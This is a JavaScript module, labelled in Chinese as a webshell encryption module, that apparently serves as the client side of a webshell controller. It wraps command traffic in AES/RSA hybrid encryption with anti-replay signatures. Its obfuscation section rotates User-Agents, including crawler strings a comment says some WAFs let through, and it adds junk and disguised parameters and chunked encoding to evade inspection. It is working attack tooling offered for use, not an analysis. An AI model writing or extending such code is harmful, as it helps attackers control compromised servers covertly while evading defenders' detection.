/**
 * Webshell 加密模块 v2.0
 * 支持 RSA2048+AES256-CBC 强加密、流量防重放
 */

const WebshellCrypto = (function() {
    // 会话状态
    let sessionState = {
        key: null,
        iv: null,
        sessionId: null,
        rsaKeyPair: null,
        serverPublicKey: null,
        timestamp: null,
        sequence: 0
    };

    // ==================== 基础工具 ====================

    // 生成随机字节
    function getRandomBytes(length) {
        const array = new Uint8Array(length);
        crypto.getRandomValues(array);
        return array;
    }

    // 字节数组转 Base64
    function bytesToBase64(bytes) {
        let binary = '';
        bytes.forEach(byte => binary += String.fromCharCode(byte));
        return btoa(binary);
    }

    // Base64 转字节数组
    function base64ToBytes(base64) {
        const binary = atob(base64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        return bytes;
    }

    // 字节数组转十六进制
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // 十六进制转字节数组
    function hexToBytes(hex) {
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < hex.length; i += 2) {
            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
        }
        return bytes;
    }

    // 字符串转字节数组 (UTF-8)
    function stringToBytes(str) {
        return new TextEncoder().encode(str);
    }

    // 字节数组转字符串 (UTF-8)
    function bytesToString(bytes) {
        return new TextDecoder().decode(bytes);
    }

    // ==================== AES-256-CBC 加密 ====================

    // 生成 AES-256 密钥 (32字节)
    async function generateAESKey() {
        return crypto.subtle.generateKey(
            { name: 'AES-CBC', length: 256 },
            true,
            ['encrypt', 'decrypt']
        );
    }

    // AES-256-CBC 加密
    async function aesEncrypt(data, key, iv = null) {
        if (typeof data === 'string') {
            data = stringToBytes(data);
        }
        if (!iv) {
            iv = getRandomBytes(16);
        }
        if (iv instanceof Uint8Array === false) {
            iv = new Uint8Array(iv);
        }

        const encrypted = await crypto.subtle.encrypt(
            { name: 'AES-CBC', iv: iv },
            key,
            data
        );

        return {
            iv: bytesToBase64(iv),
            data: bytesToBase64(new Uint8Array(encrypted))
        };
    }

    // AES-256-CBC 解密
    async function aesDecrypt(encryptedData, key, iv) {
        if (typeof iv === 'string') {
            iv = base64ToBytes(iv);
        }
        if (typeof encryptedData === 'string') {
            encryptedData = base64ToBytes(encryptedData);
        }

        const decrypted = await crypto.subtle.decrypt(
            { name: 'AES-CBC', iv: iv },
            key,
            encryptedData
        );

        return bytesToString(new Uint8Array(decrypted));
    }

    // 从原始密钥导入 AES 密钥
    async function importAESKey(rawKey) {
        if (typeof rawKey === 'string') {
            rawKey = stringToBytes(rawKey);
        }
        if (rawKey.length < 32) {
            // 填充到 32 字节
            const padded = new Uint8Array(32);
            padded.set(rawKey.slice(0, 32));
            rawKey = padded;
        }
        return crypto.subtle.importKey(
            'raw',
            rawKey.slice(0, 32),
            { name: 'AES-CBC', length: 256 },
            true,
            ['encrypt', 'decrypt']
        );
    }

    // ==================== RSA-2048 加密 ====================

    // 生成 RSA 密钥对
    async function generateRSAKeyPair() {
        return crypto.subtle.generateKey(
            {
                name: 'RSA-OAEP',
                modulusLength: 2048,
                publicExponent: new Uint8Array([1, 0, 1]),
                hash: 'SHA-256'
            },
            true,
            ['encrypt', 'decrypt']
        );
    }

    // 导出公钥为 PEM 格式
    async function exportPublicKeyPEM(keyPair) {
        const exported = await crypto.subtle.exportKey('spki', keyPair.publicKey);
        const exportedAsBase64 = bytesToBase64(new Uint8Array(exported));
        return `-----BEGIN PUBLIC KEY-----\n${exportedAsBase64.match(/.{1,64}/g).join('\n')}\n-----END PUBLIC KEY-----`;
    }

    // 从 PEM 格式导入公钥
    async function importPublicKeyPEM(pem) {
        const pemContents = pem.replace(/-----BEGIN PUBLIC KEY-----/, '')
                               .replace(/-----END PUBLIC KEY-----/, '')
                               .replace(/\s/g, '');
        const binaryKey = base64ToBytes(pemContents);
        return crypto.subtle.importKey(
            'spki',
            binaryKey,
            { name: 'RSA-OAEP', hash: 'SHA-256' },
            true,
            ['encrypt']
        );
    }

    // RSA 加密
    async function rsaEncrypt(data, publicKey) {
        if (typeof data === 'string') {
            data = stringToBytes(data);
        }
        const encrypted = await crypto.subtle.encrypt(
            { name: 'RSA-OAEP' },
            publicKey,
            data
        );
        return bytesToBase64(new Uint8Array(encrypted));
    }

    // RSA 解密
    async function rsaDecrypt(encryptedData, privateKey) {
        if (typeof encryptedData === 'string') {
            encryptedData = base64ToBytes(encryptedData);
        }
        const decrypted = await crypto.subtle.decrypt(
            { name: 'RSA-OAEP' },
            privateKey,
            encryptedData
        );
        return new Uint8Array(decrypted);
    }

    // ==================== 混合加密 (RSA+AES) ====================

    // 初始化加密会话
    async function initSecureSession(password) {
        // 1. 生成会话 ID
        sessionState.sessionId = generateSessionId();
        sessionState.timestamp = Date.now();
        sessionState.sequence = 0;

        // 2. 从密码派生 AES 密钥
        const passwordKey = await deriveKeyFromPassword(password);
        sessionState.key = passwordKey;

        // 3. 生成随机 IV
        sessionState.iv = getRandomBytes(16);

        // 4. 生成 RSA 密钥对 (用于密钥交换)
        try {
            sessionState.rsaKeyPair = await generateRSAKeyPair();
        } catch (e) {
            console.warn('RSA key generation not supported:', e);
        }

        return {
            sessionId: sessionState.sessionId,
            timestamp: sessionState.timestamp
        };
    }

    // 从密码派生密钥 (PBKDF2)
    async function deriveKeyFromPassword(password, salt = null) {
        if (!salt) {
            salt = stringToBytes('TMboxSalt2024');
        }
        const passwordBuffer = stringToBytes(password);
        const keyMaterial = await crypto.subtle.importKey(
            'raw',
            passwordBuffer,
            'PBKDF2',
            false,
            ['deriveKey']
        );

        return crypto.subtle.deriveKey(
            {
                name: 'PBKDF2',
                salt: salt,
                iterations: 100000,
                hash: 'SHA-256'
            },
            keyMaterial,
            { name: 'AES-CBC', length: 256 },
            true,
            ['encrypt', 'decrypt']
        );
    }

    // 混合加密数据 (用于发送)
    async function hybridEncrypt(data, serverPublicKey = null) {
        // 1. 生成临时 AES 密钥
        const tempKey = await generateAESKey();
        const tempIV = getRandomBytes(16);

        // 2. 用 AES 加密数据
        const encryptedData = await aesEncrypt(data, tempKey, tempIV);

        // 3. 导出临时 AES 密钥
        const rawKey = await crypto.subtle.exportKey('raw', tempKey);
        const keyData = {
            key: bytesToBase64(new Uint8Array(rawKey)),
            iv: bytesToBase64(tempIV)
        };

        // 4. 如果有服务器公钥，用 RSA 加密 AES 密钥
        let encryptedKey;
        if (serverPublicKey) {
            encryptedKey = await rsaEncrypt(JSON.stringify(keyData), serverPublicKey);
        } else {
            // 回退到会话密钥加密
            encryptedKey = bytesToBase64(stringToBytes(JSON.stringify(keyData)));
        }

        return {
            key: encryptedKey,
            data: encryptedData.data,
            iv: encryptedData.iv
        };
    }

    // 混合解密数据 (用于接收)
    async function hybridDecrypt(encryptedPackage) {
        // 使用会话密钥解密
        if (!sessionState.key) {
            throw new Error('Session not initialized');
        }

        const iv = base64ToBytes(encryptedPackage.iv);
        const data = base64ToBytes(encryptedPackage.data);

        return await aesDecrypt(data, sessionState.key, iv);
    }

    // ==================== 防重放攻击 ====================

    // 生成会话 ID
    function generateSessionId() {
        const bytes = getRandomBytes(16);
        return bytesToHex(bytes);
    }

    // 生成时间戳
    function getTimestamp() {
        return Date.now();
    }

    // 生成序列号
    function getNextSequence() {
        return ++sessionState.sequence;
    }

    // 验证时间戳 (防止重放)
    function validateTimestamp(timestamp, maxAge = 30000) {
        const now = Date.now();
        const diff = Math.abs(now - timestamp);
        return diff <= maxAge;
    }

    // 生成请求签名
    async function generateRequestSign(payload, timestamp, sequence) {
        const signData = `${payload}|${timestamp}|${sequence}|${sessionState.sessionId}`;
        const encoder = new TextEncoder();
        const data = encoder.encode(signData);

        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // 构建安全请求包
    async function buildSecurePacket(payload) {
        const timestamp = getTimestamp();
        const sequence = getNextSequence();

        // 加密 payload
        let encryptedPayload;
        if (sessionState.key) {
            encryptedPayload = await aesEncrypt(payload, sessionState.key, sessionState.iv);
        } else {
            encryptedPayload = { data: btoa(payload), iv: '' };
        }

        // 生成签名
        const signature = await generateRequestSign(encryptedPayload.data, timestamp, sequence);

        return {
            sessionId: sessionState.sessionId,
            timestamp: timestamp,
            sequence: sequence,
            payload: encryptedPayload.data,
            iv: encryptedPayload.iv,
            signature: signature
        };
    }

    // ==================== HTTP 混淆 ====================

    // 随机 User-Agent 列表
    const USER_AGENTS = [
        // Chrome Windows
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        // Chrome Mac
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        // Firefox
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        // Safari
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        // Edge
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        // Mobile
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        // 搜索引擎爬虫 (某些 WAF 会放行)
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
    ];

    // 获取随机 User-Agent
    function getRandomUserAgent() {
        return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    }

    // 生成垃圾填充数据
    function generateJunkData(minLen = 100, maxLen = 500) {
        const length = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    // 生成混淆的参数名
    function generateObfuscatedParamName() {
        const prefixes = ['data', 'content', 'payload', 'info', 'msg', 'body', 'request', 'response'];
        const suffixes = ['', '_data', '_content', '_text', '_json', '_base64'];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
        const rand = Math.random().toString(36).substr(2, 4);
        return prefix + rand + suffix;
    }

    // 构建 HTTP 混淆参数
    function buildObfuscatedParams(mainData, paramName) {
        const params = {};

        // 1. 主数据使用指定或随机参数名
        const mainParam = paramName || generateObfuscatedParamName();
        params[mainParam] = mainData;

        // 2. 添加垃圾参数
        const junkParamCount = Math.floor(Math.random() * 5) + 2;
        for (let i = 0; i < junkParamCount; i++) {
            const junkParam = generateObfuscatedParamName();
            params[junkParam] = generateJunkData(50, 200);
        }

        // 3. 添加看起来合法的参数
        params['_t'] = Date.now().toString();
        params['_token'] = generateJunkData(32, 32);

        return params;
    }

    // ==================== Chunked Transfer Encoding ====================

    // 将数据分割为 chunks
    function splitIntoChunks(data, chunkSize = 65536) {
        if (typeof data === 'string') {
            data = stringToBytes(data);
        }
        const chunks = [];
        for (let i = 0; i < data.length; i += chunkSize) {
            chunks.push(data.slice(i, i + chunkSize));
        }
        return chunks;
    }

    // 构建 chunked 请求体
    function buildChunkedBody(chunks) {
        let body = '';
        for (const chunk of chunks) {
            const chunkData = typeof chunk === 'string' ? chunk : bytesToString(chunk);
            const chunkBase64 = btoa(chunkData);
            body += chunkBase64.length.toString(16) + '\r\n';
            body += chunkBase64 + '\r\n';
        }
        body += '0\r\n\r\n';
        return body;
    }

    // 解析 chunked 响应
    function parseChunkedResponse(body) {
        const lines = body.split('\r\n');
        let result = '';
        let i = 0;

        while (i < lines.length) {
            const size = parseInt(lines[i], 16);
            if (size === 0) break;
            i++;
            if (lines[i]) {
                result += atob(lines[i]);
            }
            i++;
        }

        return result;
    }

    // ==================== 简化版加密 (无 Web Crypto API 时) ====================

    // XOR 加密
    function xorEncrypt(data, key) {
        const result = [];
        for (let i = 0; i < data.length; i++) {
            result.push(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return String.fromCharCode(...result);
    }

    // 简单 Base64 编码加密
    function simpleEncrypt(data, key) {
        const xored = xorEncrypt(data, key);
        return btoa(xored);
    }

    // 简单 Base64 解密
    function simpleDecrypt(data, key) {
        const decoded = atob(data);
        return xorEncrypt(decoded, key);
    }

    // ==================== 导出 API ====================

    return {
        // 基础工具
        getRandomBytes,
        bytesToBase64,
        base64ToBytes,
        bytesToHex,
        hexToBytes,
        stringToBytes,
        bytesToString,

        // AES
        generateAESKey,
        aesEncrypt,
        aesDecrypt,
        importAESKey,

        // RSA
        generateRSAKeyPair,
        exportPublicKeyPEM,
        importPublicKeyPEM,
        rsaEncrypt,
        rsaDecrypt,

        // 混合加密
        initSecureSession,
        hybridEncrypt,
        hybridDecrypt,
        deriveKeyFromPassword,

        // 防重放
        generateSessionId,
        getTimestamp,
        getNextSequence,
        validateTimestamp,
        generateRequestSign,
        buildSecurePacket,

        // HTTP 混淆
        getRandomUserAgent,
        generateJunkData,
        generateObfuscatedParamName,
        buildObfuscatedParams,

        // Chunked
        splitIntoChunks,
        buildChunkedBody,
        parseChunkedResponse,

        // 简化加密
        xorEncrypt,
        simpleEncrypt,
        simpleDecrypt,

        // 状态访问
        getSessionState: () => ({ ...sessionState }),
        getSessionId: () => sessionState.sessionId,
        getSessionKey: () => sessionState.key
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellCrypto;
}
